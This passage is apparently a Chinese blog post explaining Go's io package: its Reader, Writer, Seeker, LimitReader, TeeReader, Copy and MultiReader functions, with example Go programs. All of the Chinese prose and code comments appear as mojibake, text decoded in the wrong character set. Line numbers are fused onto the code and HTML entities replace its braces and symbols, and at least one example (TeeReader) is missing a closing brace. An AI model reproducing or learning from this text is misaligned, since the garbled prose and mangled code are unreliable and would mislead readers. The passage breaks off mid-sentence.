å¯ä»¥æŠŠæµæƒ³è±¡æˆä¸€ä¸ªæ°´ç®¡ï¼Œæ•°æ®å°±æ˜¯æ°´ç®¡é‡Œçš„æ°´ï¼Œä½†æ˜¯åªèƒ½å•å‘æµåŠ¨ã€‚Input Streamå°±æ˜¯æ•°æ®ä»Žå¤–é¢ï¼ˆç£ç›˜ã€ç½‘ç»œï¼‰æµè¿›å†…å­˜ï¼ŒOutput Streamå°±æ˜¯æ•°æ®ä»Žå†…å­˜æµåˆ°å¤–é¢åŽ»ã€‚è€Œåƒæ°´ç®¡è¿™æ ·çš„ä¸œè¥¿ï¼Œåœ¨ä¸åŒè¯­è¨€é‡ŒåŸºæœ¬éƒ½æœ‰ä¸€ä¸ªä¸€æ ·çš„åç§°:pipe, Golangä¸­å…³äºŽpipeçš„ä¸€äº›åŠŸèƒ½å‡½æ•°éƒ½å®šä¹‰åœ¨è¿™ä¸ªæ–‡ä»¶é‡Œé¢ã€‚ IOåŒ…çš„æ–‡ä»¶ä¸è¦æœ‰ææƒ§å¿ƒç†, IOæ ‡å‡†åº“çš„ä»£ç é‡å…¶å®žå¹¶ä¸å¤š, é™¤åŽ»testå’Œexample, å‰©ä¸‹çš„æ¨¡å—å…¶å®žå°±5ä¸ª(io.go, multi.go, pipe.go, ioutil.go, tempfile.go), æ€»å…±ä¹Ÿæ‰åƒä½™è¡Œä»£ç ï¼Œè€Œä¸”è¿˜æœ‰å°†è¿‘ä¸€åŠæ˜¯æ³¨é‡Šã€‚1234567891011121314151617âžœ io tree ..â”œâ”€â”€ example_test.goâ”œâ”€â”€ io.goâ”œâ”€â”€ io_test.goâ”œâ”€â”€ ioutilâ”‚ â”œâ”€â”€ example_test.goFâ”‚ â”œâ”€â”€ ioutil.goâ”‚ â”œâ”€â”€ ioutil_test.goâ”‚ â”œâ”€â”€ tempfile.goâ”‚ â””â”€â”€ tempfile_test.goâ”œâ”€â”€ multi.goâ”œâ”€â”€ multi_test.goâ”œâ”€â”€ pipe.goâ””â”€â”€ pipe_test.go1 directory, 12 files è¿™ç¯‡åšå®¢ä¸»è¦å…³æ³¨io.goï¼Œmulti.go, pipe.go 3ä¸ªæ–‡ä»¶ã€‚ ä»ŽIOåŒ…çš„æ³¨è§£å¼€å§‹è®²èµ·ioåŒ…ä¸ºI/OåŽŸè¯­æä¾›äº†åŸºæœ¬çš„æŽ¥å£ã€‚å®ƒä¸»è¦åŠŸèƒ½æ˜¯åŒ…è£…äº†è¿™äº›åŽŸè¯­çš„å·²æœ‰å®žçŽ°, è¿™ä¸ªæè¿°å¾—æœ‰ç‚¹ç»•, ç›´ç™½æ¥è¯´: IOè¡¨ç¤ºçš„æ˜¯ä¸€ä¸ªè¿‡ç¨‹(è¾“å…¥ä¸Žè¾“å‡º), IOåŒ…å°±æ˜¯å°†è¾“å…¥ä¸Žè¾“å‡ºçš„è§„èŒƒå®šä¹‰æ¸…æ¥š(ä¸€äº›é€šç”¨çš„æŽ¥å£å’Œå‡½æ•°), è€Œå…·ä½“çš„è¾“å…¥ä»€ä¹ˆ,è¾“å‡ºä»€ä¹ˆ, æ˜¯ç”±å…·ä½“çš„å¯¹è±¡æ¥å®žçŽ°,æ¯”å¦‚åŽé¢åº”ç”¨æ—¶éœ€è¦è®²åˆ°çš„strings, bytes, fileç­‰ã€‚ç”±äºŽè¿™äº›æŽ¥å£å’ŒåŽŸè¯­ä»¥ä¸åŒçš„å®žçŽ°åŒ…è£…äº†ä½Žçº§æ“ä½œï¼Œå› æ­¤é™¤éžå¦è¡Œé€šçŸ¥ï¼Œå¦åˆ™å®¢æˆ·ç«¯ä¸åº”å‡å®šå®ƒä»¬å¯¹äºŽå¹¶è¡Œæ‰§è¡Œæ˜¯å®‰å…¨çš„ã€‚ io.goæºç åˆ†æžæˆ‘ä»¬å…ˆä»ŽIOåŒ…çš„æ ¸å¿ƒæ–‡ä»¶io.goå¼€å§‹è¯»èµ·, è¯¥æ–‡ä»¶ä¸»è¦å®šä¹‰äº†å•è·¯è¯»å†™çš„ç›¸å…³è§„èŒƒ åŸºç¡€IOæŽ¥å£çš„å®šä¹‰åŸºç¡€æŽ¥å£æ¶‰åŠåˆ°è¯»ï¼Œå†™ï¼Œå…³é—­ï¼Œä»¥åŠæŒ‡é’ˆä½ç½®è¿™4ä¸ªæ–¹é¢ã€‚ Reader: æ•°æ®è¯»å–çš„æ–¹æ³•: Read, å¦‚æžœå¯¹è±¡æ˜¯ä¸€ä¸ªReaderå¯¹è±¡,é‚£ä¹ˆæˆ‘ä»¬å°±èƒ½è°ƒç”¨Readè¯»å–å…¶ä¸­çš„æ•°æ®ã€‚ ReadAt: ä»Žåç§»é‡offå¤„å¼€å§‹è¯»å–æ•°æ®çš„æ–¹æ³•: ReadAt ReaderFrom: ä»Žä¸€ä¸ªReaderå¯¹è±¡ä¸­è¯»å…¥æ•°æ®: ReaderFrom, æ–¹ä¾¿å¯¹è±¡ä¹‹é—´çš„æ•°æ®è¯»å–ã€‚ Writer: å®šä¹‰äº†æ•°æ®å†™å…¥çš„æ–¹æ³•: Write, å¦‚æžœå¯¹è±¡æ˜¯ä¸€ä¸ªWriterå¯¹è±¡, é‚£ä¹ˆæˆ‘ä»¬å°±èƒ½è°ƒç”¨Writeå¾€è¯¥å¯¹è±¡å†™å…¥æ•°æ®ã€‚ WriterAt: ä»Žåç§»é‡offå¤„å¼€å§‹å†™å…¥æ•°æ®çš„æ–¹æ³•: WriterAt WriterTo: å¾€ä¸€ä¸ªWriterå¯¹è±¡ä¸­å†™å…¥æ•°æ®: WriterTo, æ–¹ä¾¿å¯¹è±¡ä¹‹é—´çš„æ•°æ®å†™å…¥ã€‚ Closer: å®šä¹‰äº†å…³é—­æ•°æ®æµçš„æ–¹æ³•ã€‚ Seeker: å®šä¹‰è®¾ç½®è¯»å†™æ—¶ åç§»é‡(åç§»æŒ‡é’ˆ)çš„å€¼ã€‚ è¯»æŽ¥å£å’Œå‡½æ•°1234567891011type Reader interface &#123; Read(p []byte) (n int, err error)&#125;type ReaderAt interface &#123; ReadAt(p []byte, off int64) (n int, err error)&#125;type WriterTo interface &#123; WriteTo(w Writer) (n int64, err error)&#125; Read: å°†len(p)ä¸ªå­—èŠ‚è¯»å–åˆ°pä¸­ã€‚å®ƒè¿”å›žè¯»å–çš„å­—èŠ‚æ•°nï¼ˆ0 &lt;= n &lt;= len(p)ï¼‰ä»¥åŠä»»ä½•é‡åˆ°çš„é”™è¯¯, ä¹Ÿå°±æ˜¯è¯´ï¼Œå½“Readæ–¹æ³•è¿”å›žé”™è¯¯æ—¶ï¼Œä¸ä»£è¡¨æ²¡æœ‰è¯»å–åˆ°ä»»ä½•æ•°æ®ã€‚è°ƒç”¨è€…åº”è¯¥å¤„ç†è¿”å›žçš„ä»»ä½•æ•°æ®ï¼Œä¹‹åŽæ‰å¤„ç†å¯èƒ½çš„é”™è¯¯ã€‚ ReadAt: ä»ŽåŸºæœ¬è¾“å…¥æºçš„åç§»é‡offå¤„å¼€å§‹ï¼Œå°†len(p)ä¸ªå­—èŠ‚è¯»å–åˆ°pä¸­ã€‚å®ƒè¿”å›žè¯»å–çš„å­—èŠ‚æ•°nï¼ˆ0 &lt;= n &lt;= len(p)ï¼‰ä»¥åŠä»»ä½•é‡åˆ°çš„é”™è¯¯ã€‚ WriterTo: å°†æ•°æ®å†™å…¥wä¸­ï¼Œç›´åˆ°æ²¡æœ‰æ•°æ®å¯å†™æˆ–å‘ç”Ÿé”™è¯¯ã€‚å…¶è¿”å›žå€¼nä¸ºå†™å…¥çš„å­—èŠ‚æ•°ã€‚ åœ¨å†™å…¥è¿‡ç¨‹ä¸­é‡åˆ°çš„ä»»ä½•é”™è¯¯ä¹Ÿå°†è¢«è¿”å›ž, è¿™ä¸ªå’ŒReadFromå¯¹æ¯”ç€çœ‹, ReadFromä»ŽReaderå¯¹è±¡ä¸­ç›´æŽ¥è¯»å–æ•°æ®ï¼Œè€ŒWriterToå¯ä»¥ç›´æŽ¥å¾€ä¸€ä¸ªWriterä¸­å†™å…¥æ•°æ®.stringsçš„readerå®žçŽ°äº†è¿™3ä¸ªæŽ¥å£ï¼Œä»¥ä»–ä¸ºä¾‹,å…·ä½“å¯ä»¥å‚è€ƒstrings readerçš„æºç .1234567891011121314151617181920212223242526272829package mainimport ( "fmt" "os" "strings")func main() &#123; content := "example for io.Read, io.ReadAt, io.WriteTo" reader := strings.NewReader(content) read := make([]byte, 50) readAt := make([]byte, 50) // é€šè¿‡Readè¯»å–æ‰€æœ‰æ•°æ®,å¦‚æžœè¯»å–å®Œæˆï¼Œè¯»æŒ‡é’ˆå·²ç»ç§»åˆ°æœ€åŽ // é€šè¿‡Lenå¯ä»¥çŸ¥é“è¿˜å‰©å¤šå°‘æ²¡è¯»ï¼Œå› ä¸ºæŒ‡é’ˆä½ç½®Readeræ²¡æœ‰å®žçŽ°æš´éœ² reader.Read(read) fmt.Println("read:", string(read)) fmt.Println("unread:", reader.Len()) // é€šè¿‡ReadAtä»Žç¬¬9ä¸ªå­—ç¬¦å¼€å§‹è¯»å–,ä½†æ˜¯æ²¡æœ‰ç§»åˆ°è¯»æŒ‡é’ˆçš„ä½ç½®(io.ReadAtçš„è§„èŒƒ) reader.ReadAt(readAt, 8) fmt.Println("readAt:", string(readAt)) // ç”±äºŽè¯»æŒ‡é’ˆå·²ç»ç§»åˆ°æœ€åŽ, æ‰€ä»¥éœ€è¦æ¢å¤ // å°†readerçš„æ•°æ®ç›´æŽ¥è¾“å‡ºç»™writer, reader.Seek(0, 0) reader.WriteTo(os.Stdout)&#125; è·ŸReaderæœ‰å…³çš„å‡½æ•°:1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162// LimitReaderfunc LimitReader(r Reader, n int64) Reader &#123; return &amp;LimitedReader&#123;r, n&#125; &#125;type LimitedReader struct &#123; R Reader // underlying reader N int64 // max bytes remaining&#125;func (l *LimitedReader) Read(p []byte) (n int, err error) &#123; if l.N &lt;= 0 &#123; return 0, EOF &#125; if int64(len(p)) &gt; l.N &#123; p = p[0:l.N] &#125; n, err = l.R.Read(p) l.N -= int64(n) return&#125;// TeeReaderfunc TeeReader(r Reader, w Writer) Reader &#123; return &amp;teeReader&#123;r, w&#125;&#125;type teeReader struct &#123; r Reader w Writer&#125;func (t *teeReader) Read(p []byte) (n int, err error) &#123; n, err = t.r.Read(p) if n &gt; 0 &#123; if n, err := t.w.Write(p[:n]); err != nil &#123; return n, err &#125; &#125; return&#125;// ReadAtLeastfunc ReadAtLeast(r Reader, buf []byte, min int) (n int, err error) &#123; if len(buf) &lt; min &#123; return 0, ErrShortBuffer &#125; for n &lt; min &amp;&amp; err == nil &#123; var nn int nn, err = r.Read(buf[n:]) n += nn &#125; if n &gt;= min &#123; err = nil &#125; else if n &gt; 0 &amp;&amp; err == EOF &#123; err = ErrUnexpectedEOF &#125; return&#125;// ReadFullfunc ReadFull(r Reader, buf []byte) (n int, err error) &#123; return ReadAtLeast(r, buf, len(buf))&#125; LimitReader: è¿”å›žä¸€ä¸ªLimitReaderç»“æž„ä½“, ä»ŽRè¯»å–ä½†å°†è¿”å›žçš„æ•°æ®é‡é™åˆ¶ä¸ºNå­—èŠ‚ã€‚æ¯è°ƒç”¨ä¸€æ¬¡Readéƒ½å°†æ›´æ–°Næ¥ååº”æ–°çš„å‰©ä½™æ•°é‡ã€‚å¦‚æžœä½ çš„è¯»bufå¤§äºŽé™åˆ¶çš„é•¿åº¦, å°†ä¸€æ¬¡è¯»å–å®Œ, å¦‚æžœä½ çš„bufå°äºŽé™åˆ¶é•¿åº¦, åˆ™åªæœ‰å¤šæ¬¡å¾ªçŽ¯è¯»å–, ä»Žè€Œèµ·åˆ°é™åˆ¶è¯»å–çš„ä½œç”¨ã€‚ 1234567891011121314151617181920212223package mainimport ( "fmt" "io" "strings")func main() &#123; content := "This is limitReader example" reader := strings.NewReader(content) i := 1 // ä¸åšé™åˆ¶ï¼Œè¯»å–æ‰€æœ‰çš„å†…å®¹ limitReader := &amp;io.LimitedReader&#123;R: reader, N: int64(len(content))&#125; for limitReader.N &gt; 0 &#123; // é™åˆ¶æ€§è¯»å–, ä¸€æ¬¡è¯»å–4å­—èŠ‚ tmp := make([]byte, 4) limitReader.Read(tmp) fmt.Printf("ç¬¬%dæ¬¡: %s\n", i, tmp) i++ &#125;&#125; TeeReader: è¿”å›žä¸€ä¸ª Readerï¼Œå®ƒå°†ä»Žrä¸­è¯»åˆ°çš„æ•°æ®å†™å…¥wä¸­ã€‚æ‰€æœ‰ç»ç”±å®ƒå¤„ç†çš„ä»Žrçš„è¯»å–éƒ½åŒ¹é…äºŽå¯¹åº”çš„å¯¹wçš„å†™å…¥ã€‚å®ƒæ²¡æœ‰å†…éƒ¨ç¼“å­˜ï¼Œå³å†™å…¥å¿…é¡»åœ¨è¯»å–å®Œæˆå‰å®Œæˆã€‚ä»»ä½•åœ¨å†™å…¥æ—¶é‡åˆ°çš„é”™è¯¯éƒ½å°†ä½œä¸ºè¯»å–é”™è¯¯è¿”å›ž,ä¹Ÿå°±æ˜¯è¯´ï¼Œæˆ‘ä»¬é€šè¿‡Readerè¯»å–å†…å®¹åŽï¼Œä¼šè‡ªåŠ¨å†™å…¥åˆ°Writerä¸­åŽ» 12345678910111213141516171819202122232425262728293031package mainimport ( "fmt" "io" "os" "strings")func main() &#123; var ( err error nn int n int ) content := "This is teeReader example\n" // å¤åˆ¶ä¸€ä»½æµåˆ°æ ‡å‡†è¾“å‡º reader := io.TeeReader(strings.NewReader(content), os.Stdout) p := make([]byte, len(content)) n, err = reader.Read(p) // è¯»å®Œæ•°æ® for err != io.EOF &#123; nn, err = reader.Read(p[n:]) n += nn fmt.Printf("my read: %s", string(p))&#125; ReadAtLeast:å°†rè¯»å–åˆ°bufä¸­ï¼Œç›´åˆ°è¯»äº†æœ€å°‘minä¸ªå­—èŠ‚ä¸ºæ­¢,å› æ­¤bufå¿…é¡»å¤§äºŽæœ€å°å­—èŠ‚æ•°,ä¸ç„¶å°±ä¼šæŠ¥é”™(bufå°äº†), è¿™ä¸ªå’ŒLimitReaderåŠŸèƒ½ç±»ä¼¼, ä½†æ˜¯ ReadFull: ç²¾ç¡®åœ°ä»Žrä¸­å°†len(buf)ä¸ªå­—èŠ‚è¯»å–åˆ°bufä¸­,å°†bufè¯»æ»¡, å®žé™…ä¸ŠReadFullå°±æ˜¯è°ƒç”¨çš„ReadAtLeastæ¥å°†bufå¡«æ»¡çš„,12345678910111213141516171819202122package mainimport ( "fmt" "io" "log" "strings")func main() &#123; content := "This is readFull example\n" p := make([]byte, len(content)) _, err := io.ReadFull(strings.NewReader(content), p) if err != nil &#123; log.Fatal(err) &#125; fmt.Printf("my read: %s", string(p))&#125; å†™æŽ¥å£å’Œå‡½æ•°1234567891011type Writer interface &#123; Write(p []byte) (n int, err error)&#125;type ReaderFrom interface &#123; ReadFrom(r Reader) (n int64, err error)&#125;type WriterAt interface &#123; WriteAt(p []byte, off int64) (n int, err error)&#125; Writer: å°†pä¸­len(p)ä¸ªå­—èŠ‚çš„æ•°æ®å†™å…¥åˆ°åŸºæœ¬æ•°æ®æµä¸­, å®ƒè¿”å›žä»Žpä¸­è¢«å†™å…¥çš„å­—èŠ‚æ•°nï¼ˆ0 &lt;= n &lt;= len(p)ï¼‰ä»¥åŠä»»ä½•é‡åˆ°çš„å¼•èµ·å†™å…¥æå‰åœæ­¢çš„é”™è¯¯. WriterAt: å’ŒReadAtç›¸å¯¹ï¼Œä»Žpä¸­å°†len(p)ä¸ªå­—èŠ‚å†™å…¥åˆ°åç§»é‡offå¤„çš„åŸºæœ¬æ•°æ®æµä¸­,å³ä»Žåç§»é‡offå¤„å¼€å§‹å†™å…¥ ReadFrom: å‡½æ•°å°†io.Readerä½œä¸ºå‚æ•°ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼ŒReadFromå¯ä»¥ä»Žä»»æ„Readerå¯¹è±¡ä¸­è¯»å–æ•°æ®ï¼Œåªè¦æ¥æºå®žçŽ°äº†io.ReaderæŽ¥å£ã€‚æ¯”å¦‚ï¼Œæˆ‘ä»¬å¯ä»¥ä»Žæ ‡å‡†è¾“å…¥ã€æ–‡ä»¶ã€å­—ç¬¦ä¸²ç­‰è¯»å–æ•°æ®ã€‚bufioå®žçŽ°äº†Writerå’ŒReadFrom, æ²¡å®žçŽ°WriterAt, æˆ‘è¿™é‡Œæ²¡æ‰©å±•ï¼Œå› ä¸ºWriteréƒ½åœ¨å·¥åŽ‚æ¨¡å¼çš„ä¿æŠ¤ä¸‹ï¼Œæ‰€æœ‰å±žæ€§éƒ½æ²¡æš´éœ²ï¼Œæ‰©å±•èµ·æ¥ä¸æ–¹ä¾¿:12345678910111213141516171819202122232425262728293031package mainimport ( "bufio" "fmt" "os" "strings")func main() &#123; content := "example for io.Writer, io.ReadFrom" writer := bufio.NewWriter(os.Stdout) // ç›´æŽ¥byteå¾€æ ‡å‡†è¾“å‡ºå†™å…¥ writer.Write([]byte(content)) writer.Flush() fmt.Println() // ä¸ºäº†æ–¹ä¾¿å…¶å®žä¹Ÿç›´æŽ¥ç›´æŽ¥å†™å…¥string writer.WriteString(content) writer.Flush() fmt.Println() // ä»ŽReaderä¸­è¯»å‡ºæ•°æ®,ç„¶åŽå†å¾€æ ‡å‡†è¾“å‡ºå†™å…¥ reader := strings.NewReader(content) writer.ReadFrom(reader) writer.Flush()&#125; è·ŸWriteræœ‰å…³çš„å‡½æ•°:123456func WriteString(w Writer, s string) (n int, err error) &#123; if sw, ok := w.(stringWriter); ok &#123; return sw.WriteString(s) &#125; return w.Write([]byte(s))&#125; WriteString: å°†å­—ç¬¦ä¸²å†…å®¹å†™å…¥åˆ°writerä¸­, å¦‚æžœwriterå®žçŽ°äº†WriteStringåˆ™ç›´æŽ¥è°ƒç”¨å®ƒçš„æ–¹æ³•å†™å…¥,å¦‚æžœæ²¡æœ‰åˆ™ç›´æŽ¥è°ƒç”¨Writeå¤„ç†æˆbyteså†™å…¥, å…·ä½“ä¸Šé¢å·²ç»æœ‰æ —å­äº†. å…³é—­ä¸Žåç§»é‡1234567891011121314type Closer interface &#123; Close() error&#125;// Seek whence values.const ( SeekStart = 0 // seek relative to the origin of the file SeekCurrent = 1 // seek relative to the current offset SeekEnd = 2 // seek relative to the end)type Seeker interface &#123; Seek(offset int64, whence int) (int64, error)&#125; Closer: è¯¥æŽ¥å£æ¯”è¾ƒç®€å•ï¼Œåªæœ‰ä¸€ä¸ªClose()æ–¹æ³•ï¼Œç”¨äºŽå…³é—­æ•°æ®æµ, æ¯”å¦‚æ•°æ®åº“è¿žæŽ¥, æ–‡ä»¶ç­‰ã€‚ Seeker: è®¾ç½®ä¸‹ä¸€æ¬¡Readæˆ–Writeçš„åç§»é‡(offset)ï¼Œå®ƒçš„è§£é‡Šå–å†³äºŽ whence: 0è¡¨ç¤ºç›¸å¯¹äºŽæ–‡ä»¶çš„èµ·å§‹å¤„ï¼Œ1è¡¨ç¤ºç›¸å¯¹äºŽå½“å‰çš„åç§»ï¼Œè€Œ2è¡¨ç¤ºç›¸å¯¹äºŽå…¶ç»“å°¾å¤„ã€‚ Seekè¿”å›žæ–°çš„åç§»é‡å’Œä¸€ä¸ªé”™è¯¯ï¼Œå¦‚æžœæœ‰çš„è¯ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼ŒSeekæ–¹æ³•ç”¨äºŽè®¾ç½®åç§»é‡çš„ï¼Œè¿™æ ·å¯ä»¥ä»ŽæŸä¸ªç‰¹å®šä½ç½®å¼€å§‹æ“ä½œæ•°æ®æµã€‚å¬èµ·æ¥å’ŒReaderAt/WriteAtæŽ¥å£æœ‰äº›ç±»ä¼¼ï¼Œä¸è¿‡SeekeræŽ¥å£æ›´çµæ´»ï¼Œå¯ä»¥æ›´å¥½çš„æŽ§åˆ¶è¯»å†™æ•°æ®æµçš„ä½ç½®ã€‚1234567891011121314151617181920212223242526package mainimport ( "fmt" "log" "strings")func main() &#123; content := "å­—Seekæµ‹è¯•è¯»å–æŒ‡å®šä½ç½®çš„å­—ç¬¦" reader := strings.NewReader(content) // è¯»å–å€’æ•°ç¬¬5ä¸ªå­—ç¬¦, ç”±äºŽstring readerè®¾è®¡çš„åŽŸå›  // æ— è®ºæ˜¯ReadAt, WriteAtè¿˜æ˜¯Seekè¿™é‡Œé¢çš„offset // éƒ½æŒ‡çš„æ˜¯byteä¸ªæ•°, å¹¶ä¸”indexç´¯åŠ çš„ä¹Ÿæ˜¯byte,æ‰€ä»¥ // å°±å‘çˆ¹äº†ï¼Œè¦å–ç¬¬5ä¸ªå­—ç¬¦å®žé™…ä¸Šçš„byteä½ç½®æ˜¯5*3 // æ³¨æ„utf8 æ˜¯å˜é•¿ç¼–ç çš„, æ‰€ä»¥å¹¶ä¸æ˜¯æ‰€æœ‰çš„ä¸­æ–‡éƒ½æ˜¯3å­—èŠ‚å“¦! // æ‰€æœ‰è¿™ç§æ–¹å¼æ˜¯æœ‰é—®é¢˜çš„, è¿˜æ˜¯ä»¥å­—ç¬¦ä¸ªæ•°è¿›è¡Œè®¡ç®—åˆé€‚ reader.Seek(-15, 2) r, s, err := reader.ReadRune() if err != nil &#123; log.Fatal(err) &#125; fmt.Println(s) fmt.Printf("%c\n", r)&#125; ç»„åˆè¡ç”Ÿçš„IOæŽ¥å£ ReadWriter ReadCloser WriteCloser ReadWriteCloser ReadSeeker WriteSeeker ReadWriteSeeker è¿™äº›éƒ½æ˜¯åŸºäºŽä¸Šé¢å•ä¸ªæŽ¥å£ç»„åˆè€Œæˆ, ç†è§£ä¸Šé¢çš„åŸºç¡€è¿‡ä¼šï¼Œè¿™ä¸ªå°±ä¸å¤šè¯´äº†ã€‚ IO Copyç›¸å…³è¿™é‡Œä¸»è¦ä»‹ç»å’ŒCopyç›¸å…³çš„å‡½æ•°:12345func CopyN(dst Writer, src Reader, n int64) (written int64, err error)func Copy(dst Writer, src Reader) (written int64, err error)func CopyBuffer(dst Writer, src Reader, buf []byte) (written int64, err error) CopyN: å°†nä¸ªå­—èŠ‚ä»Žsrcå¤åˆ¶åˆ°dst. å®ƒè¿”å›žå¤åˆ¶çš„å­—èŠ‚æ•°ä»¥åŠåœ¨å¤åˆ¶æ—¶é‡åˆ°çš„æœ€æ—©çš„é”™è¯¯. Copy: å°†srcå¤åˆ¶åˆ°dstï¼Œç›´åˆ°åœ¨srcä¸Šåˆ°è¾¾EOFæˆ–å‘ç”Ÿé”™è¯¯ã€‚å®ƒè¿”å›žå¤åˆ¶çš„å­—èŠ‚æ•°ï¼Œå¦‚æžœæœ‰çš„è¯ï¼Œè¿˜ä¼šè¿”å›žåœ¨å¤åˆ¶æ—¶é‡åˆ°çš„ç¬¬ä¸€ä¸ªé”™è¯¯ã€‚ CopyBuffer: ç›¸å½“äºŽ Copyï¼Œåªä¸ Copy åœ¨æ‰§è¡Œçš„è¿‡ç¨‹ä¸­ä¼šåˆ›å»ºä¸€ä¸ªä¸´æ—¶çš„ç¼“å†²åŒºæ¥ä¸­è½¬æ•°æ®ï¼Œè€Œ CopyBuffer åˆ™å¯ä»¥å•ç‹¬æä¾›ä¸€ä¸ªç¼“å†²åŒºè®©å¤šä¸ªå¤åˆ¶æ“ä½œå…±ç”¨åŒä¸€ä¸ªç¼“å†²åŒºï¼Œé¿å…æ¯æ¬¡å¤åˆ¶æ“ä½œéƒ½åˆ›å»ºæ–°çš„ç¼“å†²åŒºã€‚å¦‚æžœ buf == nilï¼Œåˆ™ CopyBuffer ä¼šè‡ªåŠ¨åˆ›å»ºç¼“å†²åŒºã€‚ ä¸¾ä¸€ç»„æ —å­:12345678910111213141516171819202122232425262728293031package mainimport ( "fmt" "io" "os" "strings")func main() &#123; content := "Copyç›¸å…³æ“ä½œçš„æµ‹è¯•\n" reader := strings.NewReader(content) writer := os.Stdout // copy 10 ä¸ªå­—èŠ‚4çš„Asciiå’Œ2ä¸ªä¸­æ–‡ io.CopyN(writer, reader, 10) fmt.Println() // é‡ç½®è¯»æŒ‡é’ˆ,ä»Žæ–°å®Œæˆ1æ¬¡å®Œæ•´çš„copy reader.Seek(0, 0) io.Copy(writer, reader) // åˆ›å»ºä¸€ä¸ª32å­—èŠ‚çš„ç¼“å­˜ç”¨äºŽæ‰€æœ‰copyä½¿ç”¨,ä¸ç”¨å†å¼€è¾Ÿä¸´æ—¶ç¼“å­˜ buf := make([]byte, 32) r1 := strings.NewReader("CopyBufferæµ‹è¯•ç¬¬ä¸€æ¬¡\n") io.CopyBuffer(writer, r1, buf) r2 := strings.NewReader("CopyBufferæµ‹è¯•ç¬¬äºŒæ¬¡\n") io.CopyBuffer(writer, r2, buf)&#125; Byteå’ŒRuneç±»åž‹IOç›¸å…³é’ˆå¯¹åŸºç¡€æ•°æ®ç»“æž„çš„IOè¯»å†™,å¤§æ¦‚æœ‰å¦‚ä¸‹å‡ ç±»:Byte, Rune, Section, ä¸»è¦å®šä¹‰äº†å¦‚ä½•è¯»å–ä¸€ä¸ªå­—èŠ‚å’Œä¸€ä¸ªUnicodeå­—ç¬¦çš„è§„èŒƒ, ä¸€èˆ¬åœ°ï¼Œæˆ‘ä»¬ä¸ä¼šä½¿ç”¨bytes.Bufferæ¥ä¸€æ¬¡è¯»å–æˆ–å†™å…¥ä¸€ä¸ªå­—èŠ‚, ä½†æ˜¯åœ¨å¤„ç†äºŒè¿›åˆ¶æ•°æ®å’Œæ•°æ®åŽ‹ç¼©æ—¶ è¿™äº›æŽ¥å£ç”¨å¾—æ¯”è¾ƒå¤šã€‚ RuneReader: è¯»å–å•ä¸ªUTF-8å­—ç¬¦, è¿”å›žå…¶runeå’Œè¯¥å­—ç¬¦å ç”¨çš„å­—èŠ‚ RuneScanner: ç›¸è¾ƒäºŽRuneReaderè€Œè¨€, ä»…å¢žåŠ äº†ä¸€ä¸ªUnreadBytæŽ¥å£, UnreadByteæ–¹æ³•çš„æ„æ€æ˜¯ï¼šå°†ä¸Šä¸€æ¬¡ReadByteçš„å­—èŠ‚è¿˜åŽŸï¼Œä½¿å¾—å†æ¬¡è°ƒç”¨ReadByteè¿”å›žçš„ç»“æžœå’Œä¸Šä¸€æ¬¡è°ƒç”¨ç›¸åŒï¼Œä¹Ÿå°±æ˜¯è¯´ï¼ŒUnreadByteæ˜¯é‡ç½®ä¸Šä¸€æ¬¡çš„ReadByteã€‚æ³¨æ„ï¼ŒUnreadByteè°ƒç”¨ä¹‹å‰å¿…é¡»è°ƒç”¨äº†ReadByteï¼Œä¸”ä¸èƒ½è¿žç»­è°ƒç”¨UnreadByteã€‚ ByteReader: è¯»ä¸€ä¸ªå­—èŠ‚. ByteWriter: å†™ä¸€ä¸ªå­—èŠ‚. ByteScanner: å’ŒRuneScannerç±»ä¼¼, åªæ˜¯é’ˆå¯¹çš„å¼Byteè€Œå·². ç»“æž„ä½“ SectionReader: è¿™æ˜¯ç”¨äºŽè¯»å–ç£ç›˜æ‰‡åŒºçš„æŽ¥å£, ç”±äºŽåŸºæœ¬ä¸ä¼šä½¿ç”¨åˆ°, å› æ­¤ä¸åšè§£è¯»äº†. multi.goæºç åˆ†æžè¯¥æ–‡ä»¶ä¸»è¦å®šä¹‰äº†å¤šè·¯è¯»å†™çš„ç›¸å…³è§„èŒƒ,è¿™é‡Œçš„å¤šè·¯æŒ‡çš„æ˜¯å¯¹å¤šä¸ªreaderæˆ–è€…å¤šä¸ªwriteråŒæ—¶çš„åŠ¨ä½œ,å®ƒä»¬æŽ¥æ”¶å¤šä¸ªReaderæˆ–Writerï¼Œè¿”å›žä¸€ä¸ªReaderæˆ–Writerã€‚æˆ‘ä»¬å¯ä»¥çŒœæƒ³åˆ°è¿™ä¸¤ä¸ªå‡½æ•°å°±æ˜¯æ“ä½œå¤šä¸ªReaderæˆ–Writerå°±åƒæ“ä½œä¸€ä¸ªã€‚äº‹å®žä¸Šï¼Œåœ¨ioåŒ…ä¸­å®šä¹‰äº†ä¸¤ä¸ªéžå¯¼å‡ºç±»åž‹ï¼šmutilReaderå’ŒmultiWriterï¼Œå®ƒä»¬åˆ†åˆ«å®žçŽ°äº†io.Readerå’Œio.WriteræŽ¥å£123456789type multiReader struct &#123; readers []Reader&#125;type multiWriter struct &#123; writers []Writer&#125;func MultiReader(readers ...Reader) Reader func MultiWriter(writers ...Writer) Writer MultiReader: é€»è¾‘ä¸Šå°†å¤šä¸ªReaderç»„åˆèµ·æ¥ï¼Œè¿”å›žä¸€ä¸ªæ–°çš„Reader, ä½†æ˜¯è¿™ä¸ªæ–°Readerå¹¶ä¸èƒ½é€šè¿‡è°ƒç”¨ä¸€æ¬¡Readæ–¹æ³•èŽ·å–æ‰€æœ‰Readerçš„å†…å®¹ã€‚å› ä¸ºå®ƒè¿™ä¸ªé€»è¾‘çœŸçš„ç‰¹åˆ«ç®€å•, å¾ªçŽ¯è¯»å–æ‰€æœ‰çš„Reader, è¯»å®Œä¸€ä¸ªè¿”å›žä¸€ä¸ª, åªæ˜¯æ­£å¸¸è¯»å®Œè¿‡åŽçš„EOFè¢«é‡ç½®ä¸ºnil, è¿™æ ·çš„ç»“æžœå°±æ˜¯ æˆ‘ä»¬è¿˜å¾—åœ¨å¤–é¢å†æ¬¡å¾ªçŽ¯è¯»å–ä¸€æ¬¡, ç›´åˆ°EOF1234567891011121314151617181920212223242526272829package mainimport ( "bytes" "fmt" "io" "strings")func main() &#123; readers := []io.Reader&#123; strings.NewReader("from strings reader\n"), bytes.NewBufferString("from bytes buffer\n"), &#125; reader := io.MultiReader(readers...) data := make([]byte, 0, 1024) // å¾ªçŽ¯è¯»å–æ¯ä¸ªreaderè¿”å›žçš„å†…å®¹æ¥æ‹¼æŽ¥, // 